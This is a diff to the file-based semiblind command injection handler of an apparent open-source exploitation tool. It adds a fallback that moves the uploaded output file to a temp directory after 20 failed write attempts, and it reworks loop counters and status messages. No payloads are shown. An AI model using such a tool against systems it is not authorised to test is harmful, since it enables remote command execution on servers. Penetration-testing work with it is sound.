@@ -40,6 +40,17 @@ from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_ha
  The "File-based" technique on Semiblind-based OS Command Injection.
 """
 
+# If temp-based technique failed, 
+# use the "/tmp/" directory for tempfile-based technique.
+def tfb_controller(no_result,url,delay,tmp_path,filename,http_request_method):
+  if no_result == True:
+    sys.stdout.write("(*) Trying to upload file, on temporary directory (" + tmp_path + ")...\n")
+    tfb_handler.exploitation(url,delay,filename,tmp_path,http_request_method)     
+  else :
+    sys.stdout.write("\r")
+    sys.stdout.flush()
+  #return False
+
 #-----------------------------------------------
 # The "file-based" injection technique handler
 #-----------------------------------------------
@@ -47,12 +58,20 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 
   counter = 0
   vp_flag = True
+  exit_loops = False
+  count_loops = 0
   no_result = True
+  not_again = True
   is_encoded= False
   stop_injection = False
   injection_type = "Semiblind-based Command Injection"
   technique = "file-based semiblind injection technique"
   
+  if menu.options.tmp_path:
+    tmp_path = menu.options.tmp_path
+  else:
+    tmp_path = settings.TMP_PATH
+		  
   print "(*) Testing the "+ technique + "... "
 
   # Change TAG on every request to prevent false-positive resutls.
@@ -74,8 +93,8 @@ def fb_injection_handler(url,delay,filename,http_request_method):
   else:
     SRV_ROOT_DIR = settings.SRV_ROOT_DIR
 
-  sys.stdout.write("(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... ")
-  sys.stdout.flush()
+  #sys.stdout.write("(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... ")
+  #sys.stdout.flush()
 
   # Print the findings to log file.
   output_file = open(filename + ".txt", "a")
@@ -134,6 +153,7 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	  time.sleep(delay)
 	  
 	  try:
+	    count_loops = count_loops + 1
 	    # Check if defined extra headers.
 	    request = urllib2.Request(output)
 	    headers.do_check(request)
@@ -141,27 +161,43 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	    # Evaluate test results.
 	    output = urllib2.urlopen(request)
 	    html_data = output.read()
-	    shell = re.findall(r""+TAG+"", html_data)
-	    if len(shell) != 0:
-	      sys.stdout.write("[ " + colors.GREEN + "SUCCEED" + colors.RESET + " ]")
-	      sys.stdout.flush()
+	    shell = re.findall(r"" + TAG + "", html_data)
+	    if len(shell) != 0 and not menu.options.verbose:
+	      if not_again == False:
+		sys.stdout.write("[ " + colors.GREEN + "SUCCEED" + colors.RESET + " ]")
+		sys.stdout.flush()
+	      not_again = True
 	      
 	  except urllib2.HTTPError, e:
 	      if e.getcode() == 404:
-		if not menu.options.verbose:
-		  percent = ((i*100)/total)
-		  if percent == 100:
-		    if no_result == True:
-		      percent = colors.RED + "FAILED" + colors.RESET
-		    else:
-		      percent = str(percent)+"%"
+		percent = ((i*100)/total)
+		# Show an error message, after 20 failed tries.
+		# Use the "/tmp/" directory for tempfile-based technique.
+		if count_loops == 20:
+		  print "\n" + colors.BGRED + "(x) Error: It seems that you don't have permissions to write on "+ SRV_ROOT_DIR + "." + colors.RESET
+		  tmp_upload = raw_input("(*) Do you want to try the temporary directory (" + tmp_path + ") [Y/n] > ").lower()
+		  if tmp_upload in settings.CHOISE_YES:
+		    exit_loops = True
+		    tfb_controller(no_result,url,delay,tmp_path,filename,http_request_method)
 		  else:
-		    percent = str(percent)+"%"
-		  sys.stdout.write("\r(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... [ " + percent + " ]")  
-		  sys.stdout.flush()
-		  continue
+		    continue
 		else:
-		  continue
+		  if exit_loops == False:
+		    if not menu.options.verbose:
+		      if percent == 100:
+			if no_result == True:
+			  percent = colors.RED + "FAILED" + colors.RESET
+			else:
+			  percent = str(percent)+"%"
+		      else:
+			percent = str(percent)+"%"
+		      sys.stdout.write("\r(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... [ " + percent + " ]")  
+		      sys.stdout.flush()
+		      continue
+		    else:
+		      continue
+		  else:
+		    raise
 		
 	      elif e.getcode() == 401:
 		print colors.BGRED + "(x) Error: Authorization required!" + colors.RESET + "\n"
@@ -175,11 +211,11 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	  raise
 	
 	except urllib2.URLError, e:
-	  print "\n" + colors.BGRED + "(x) Error: " + str(e.reason) + colors.RESET
+	    #print "\n" + colors.BGRED + "(x) Error: " + str(e.reason) + colors.RESET
 	  sys.exit(0)
 	
-	except :
-	    continue
+	except:
+	  continue
 	  
 	# Yaw, got shellz! 
 	# Do some magic tricks!
@@ -263,29 +299,17 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 		sys.exit(0)
 	    
 	  else:
-	    if menu.options.verbose:
-	      sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
-	      sys.stdout.flush()
+	    #if menu.options.verbose:
+	    sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
+	    sys.stdout.flush()
 	    pass
 	  
-  # If temp-based technique failed, 
-  # use the "/tmp/" directory for tempfile-based technique.
   if no_result == True:
-    if menu.options.tmp_path:
-      tmp_path = menu.options.tmp_path
-    else:
-      tmp_path = settings.TMP_PATH
-    tmp_upload = raw_input("\n(*) Do you want to try the temporary directory (" + tmp_path + ") [Y/n] > ").lower()
-    if tmp_upload in settings.CHOISE_YES:
-      sys.stdout.write("(*) Trying to upload file, on temporary directory (" + tmp_path + ")...\n")
-      tfb_handler.exploitation(url,delay,filename,tmp_path,http_request_method)     
-    else:
-      return False
-  
+    print ""
   else :
     sys.stdout.write("\r")
-    sys.stdout.flush()
-
+    sys.stdout.flush()	
+    
 def exploitation(url,delay,filename,http_request_method):
     fb_injection_handler(url,delay,filename,http_request_method)
 
